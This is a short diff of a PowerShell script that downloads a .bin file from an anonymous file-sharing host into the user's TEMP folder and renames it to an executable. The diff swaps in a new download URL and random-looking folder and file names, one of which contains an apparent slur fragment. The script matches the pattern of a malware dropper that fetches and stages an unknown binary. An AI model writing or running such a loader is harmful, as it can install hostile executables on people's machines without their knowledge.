@@ -1,8 +1,8 @@
-$DownloadUrl = 'https://files.catbox.moe/vhd5if.bin'
+$DownloadUrl = 'https://files.catbox.moe/4xqxve.bin'
 
-$TempDir = Join-Path $env:TEMP 'CatboxRunner'
-$DownloadedFile = Join-Path $TempDir 'AKCNW.exe.bin'
-$ExePath = Join-Path $TempDir 'AKCNW.exe'
+$TempDir = Join-Path $env:TEMP 'whajdmm_nig_ga_67'
+$DownloadedFile = Join-Path $TempDir 'resfwefsc.exe.bin'
+$ExePath = Join-Path $TempDir 'resfwefsc.exe'
 
 $ErrorActionPreference = 'Stop'
 $ExitCode = 1
